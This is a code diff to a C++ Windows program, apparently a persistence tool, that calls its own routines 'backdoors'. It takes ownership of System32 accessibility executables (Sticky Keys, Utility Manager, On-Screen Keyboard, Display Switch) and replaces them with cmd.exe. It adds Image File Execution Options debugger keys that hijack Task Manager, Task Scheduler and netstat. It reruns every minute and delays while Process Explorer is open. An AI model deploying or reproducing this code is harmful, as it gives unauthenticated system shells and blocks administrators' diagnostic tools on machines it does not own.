@@ -31,35 +31,31 @@ void error_handling(int status, const std::string& command) {
 }
 
 void priv_esc() {
-    //grants administrative permissions to sethc.exe (Sticky Keys)
-    error_handling(system("takeown /f C:\\Windows\\System32\\sethc.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\sethc.exe");
-    error_handling(system("icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F");
-    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Sticky Keys\033[0m" << std::endl;
+    std::vector<std::pair<std::string, std::string>> files = {
+        {"sethc.exe", "Sticky Keys"},
+        {"utilman.exe", "Utility Manager"},
+        {"osk.exe", "On Screen Keyboard"},
+        {"displayswitch.exe", "Display"}
+    };
 
-    //grants administrative permissions to utilman.exe (Utility Manager)
-    error_handling(system("takeown /f C:\\Windows\\System32\\utilman.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\utilman.exe");
-    error_handling(system("icacls C:\\Windows\\System32\\utilman.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\utilman.exe /grant administrators:F");
-    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Utility Manager\033[0m" << std::endl;
+    for (const auto& [filename, desc] : files) {
+        std::string path = "C:\\Windows\\System32\\" + filename;
 
-    //grants administrative permissions to narrator.exe (Narrator)
-    error_handling(system("takeown /f C:\\Windows\\System32\\narrator.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\narrator.exe");
-    error_handling(system("icacls C:\\Windows\\System32\\narrator.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\narrator.exe /grant administrators:F");
-    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Narrator\033[0m" << std::endl;
+        // Check if the file exists
+        if (GetFileAttributesA(path.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            std::cout << "\033[1;33m\tSkipped " << desc << " - File not found: " << filename << "\033[0m" << std::endl;
+            continue;
+        }
 
-    //grants administrative permissions to osk.exe (On Screen Keyboard)
-    error_handling(system("takeown /f C:\\Windows\\System32\\osk.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\osk.exe");
-    error_handling(system("icacls C:\\Windows\\System32\\osk.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\osk.exe /grant administrators:F");
-    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for On Screen Keyboard\033[0m" << std::endl;
+        // Grant ownership and full permissions
+        std::string takeownCmd = "takeown /f \"" + path + "\" >nul 2>&1";
+        std::string icaclsCmd = "icacls \"" + path + "\" /grant administrators:F >nul 2>&1";
 
-    //grants administrative permissions to magnify.exe (Magnifier)
-    error_handling(system("takeown /f C:\\Windows\\System32\\magnify.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\magnify.exe");
-    error_handling(system("icacls C:\\Windows\\System32\\magnify.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\magnify.exe /grant administrators:F");
-    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Magnifier\033[0m" << std::endl;
+        error_handling(system(takeownCmd.c_str()), takeownCmd.c_str());
+        error_handling(system(icaclsCmd.c_str()), icaclsCmd.c_str());
 
-    //grants administrative permissions to displayswitch.exe (Display)
-    error_handling(system("takeown /f C:\\Windows\\System32\\displayswitch.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\displayswitch.exe");
-    error_handling(system("icacls C:\\Windows\\System32\\displayswitch.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\displayswitch.exe /grant administrators:F");
-    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Display\033[0m" << std::endl;
+        std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for " << desc << "\033[0m" << std::endl;
+    }
 }
 
 int findProcess(const wchar_t* procname) {
@@ -117,13 +113,21 @@ void terminateProcess(const wchar_t* procname) {
 
 void clear_screen() {
     HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
-    COORD coord = { 0, 0 };
-    DWORD count;
-    CONSOLE_SCREEN_BUFFER_INFO csbi;
+    if (hStdOut == INVALID_HANDLE_VALUE) return;
 
-    GetConsoleScreenBufferInfo(hStdOut, &csbi);
-    FillConsoleOutputCharacter(hStdOut, ' ', csbi.dwSize.X * csbi.dwSize.Y, coord, &count);
-    SetConsoleCursorPosition(hStdOut, coord);
+    CONSOLE_SCREEN_BUFFER_INFO csbi;
+    if (!GetConsoleScreenBufferInfo(hStdOut, &csbi)) return;
+
+    DWORD cellCount = csbi.dwSize.X * csbi.dwSize.Y;
+    COORD homeCoords = {0, 0};
+    DWORD count;
+
+    if (!FillConsoleOutputCharacter(hStdOut, ' ', cellCount, homeCoords, &count)) return;
+
+    if (!FillConsoleOutputAttribute(hStdOut, csbi.wAttributes, cellCount, homeCoords, &count)) return;
+
+    SetConsoleCursorPosition(hStdOut, homeCoords);
+    std::cout << std::flush;  //flushes
 }
 
 void enableAnsi() {
@@ -137,17 +141,22 @@ void enableAnsi() {
     SetConsoleMode(hOut, dwMode);
 }
 
-void cleanup() {
-    // Give System32 admin perms (if needed)
-    error_handling(system("icacls C:\\Windows\\System32\\ /grant administrators:F >nul 2>&1"), "Grant admin permissions to System32");
+void enableUnbufferedOutput() {
+    // Disable buffering for cout and cerr
+    std::cout.setf(std::ios::unitbuf);
+    std::cerr.setf(std::ios::unitbuf);
+    
+    // For C-style stdout/stderr (redundant but thorough)
+    setvbuf(stdout, nullptr, _IONBF, 0);
+    setvbuf(stderr, nullptr, _IONBF, 0);
+}
 
+void cleanup() {
     // List of backup-original pairs
     std::vector<std::pair<std::string, std::string>> files = {
         {"old-sethc.exe", "sethc.exe"},
         {"old-utilman.exe", "utilman.exe"},
-        {"old-narrator.exe", "narrator.exe"},
         {"old-osk.exe", "osk.exe"},
-        {"old-magnify.exe", "magnify.exe"},
         {"old-displayswitch.exe", "displayswitch.exe"}
     };
 
@@ -201,22 +210,10 @@ void utility_manager() {
     error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe");
 }
 
-void narrator() {
-    //replaces narrator.exe with cmd.exe
-    error_handling(system("rename C:\\Windows\\System32\\narrator.exe old-narrator.exe >nul 2>&1"), "rename C:\\Windows\\System32\\narrator.exe old-narrator.exe");
-    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\narrator.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\narrator.exe");
-}
-
 void on_screen_keyboard() {
     //replaces osk.exe with cmd.exe
     error_handling(system("rename C:\\Windows\\System32\\osk.exe old-osk.exe >nul 2>&1"), "rename C:\\Windows\\System32\\osk.exe old-osk.exe");
     error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe");
-}
-
-void magnifier() {
-    //replaces magnify.exe with cmd.exe
-    error_handling(system("rename C:\\Windows\\System32\\magnify.exe old-magnify.exe >nul 2>&1"), "rename C:\\Windows\\System32\\magnify.exe old-magnify.exe");
-    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe");
 }
 
 void display_switch() {
@@ -269,6 +266,10 @@ void ifeo_keys() {
         "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
     std::cout << "\033[1;32m\tAdded Task Manager IFEO Registry Key\033[0m" << std::endl;
 
+    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskschd.msc\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
+        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskschd.msc\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
+    std::cout << "\033[1;32m\tAdded Task Scheduler IFEO Registry Key\033[0m" << std::endl;
+
     error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\netstat.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
         "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\netstat.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
     std::cout << "\033[1;32m\tAdded Netstat IFEO Registry Key\033[0m" << std::endl;
@@ -295,12 +296,8 @@ void execute_backdoors() {
     std::cout << "\033[1;32m\tExecuted Sticky Keys Backdoor\033[0m" << std::endl;
     utility_manager();
     std::cout << "\033[1;32m\tExecuted Utility Manager Backdoor\033[0m" << std::endl;
-    narrator();
-    std::cout << "\033[1;32m\tExecuted Narrator Backdoor\033[0m" << std::endl;
     on_screen_keyboard();
     std::cout << "\033[1;32m\tExecuted On Screen Keyboard Backdoor\033[0m" << std::endl;
-    magnifier();
-    std::cout << "\033[1;32m\tExecuted Magnifier Backdoor\033[0m" << std::endl;
     display_switch();
     std::cout << "\033[1;32m\tExecuted Display Switch Backdoor\033[0m" << std::endl;
 }
@@ -308,7 +305,7 @@ void execute_backdoors() {
 void terminateBackdoors() {
     //kills previous sessions
     std::vector<std::wstring> processList = {
-        L"sethc.exe", L"utilman.exe", L"narrator.exe", L"osk.exe", L"magnify.exe", L"displayswitch.exe"
+        L"sethc.exe", L"utilman.exe", L"osk.exe", L"displayswitch.exe"
     };
 
     for (const auto& proc : processList) {
@@ -320,21 +317,18 @@ void terminateBackdoors() {
 
 int run() {
     enableAnsi();
-    startup(); //runs basic startup (clear, ascii art, admin perms, hotkeys, cleanup)
-    
-    //terminate processes
+    enableUnbufferedOutput();
+    startup(); // Runs basic startup (clear, ASCII art, admin perms, hotkeys, cleanup)
+
     std::cout << "Terminating Processes..." << std::endl;
     terminateBackdoors();
 
-    //cleaning up old files
     std::cout << "Cleaning Up Files..." << std::endl;
     cleanup();
 
-    //executes selected backdoors
     std::cout << "Executing Backdoors..." << std::endl;
     execute_backdoors();
 
-    //sets IFEO registry keys
     std::cout << "Adding IFEO Registry Keys..." << std::endl;
     ifeo_keys();
 
@@ -342,22 +336,32 @@ int run() {
 }
 
 int main() {
+    enableUnbufferedOutput();
+
     while (true) {
         bool isProcExpRunning = (findProcess(L"procexp.exe") != 0 || findProcess(L"procexp64.exe") != 0);
 
-        if (!isProcExpRunning) {
-            run();
-            std::this_thread::sleep_for(std::chrono::minutes(1)); // Check every minute
-        }
-        else {
-            // Wait 15 minutes max if Process Explorer is open
+        if (isProcExpRunning) {
+            std::cout << "\033[1;33mProcess Explorer detected. Waiting up to 15 minutes...\033[0m" << std::endl;
+            
+            bool closedEarly = false;
             for (int i = 0; i < 15; i++) {
                 std::this_thread::sleep_for(std::chrono::minutes(1));
-                if (!(findProcess(L"procexp.exe") != 0 || findProcess(L"procexp64.exe") != 0)) {
-                    break; // Exit early if closed
+                if (findProcess(L"procexp.exe") == 0 && findProcess(L"procexp64.exe") == 0) {
+                    closedEarly = true;
+                    break;
                 }
             }
-            run();
+
+            if (!closedEarly) {
+                std::cout << "\033[1;33mContinuing after 15-minute wait.\033[0m" << std::endl;
+            } else {
+                std::cout << "\033[1;32mProcess Explorer closed early. Resuming...\033[0m" << std::endl;
+            }
         }
+
+        run();
+        std::cout << "\033[1;33mWaiting 1 Minute to Rerun...\033[0m" << std::endl;
+        std::this_thread::sleep_for(std::chrono::minutes(1));
     }
 }
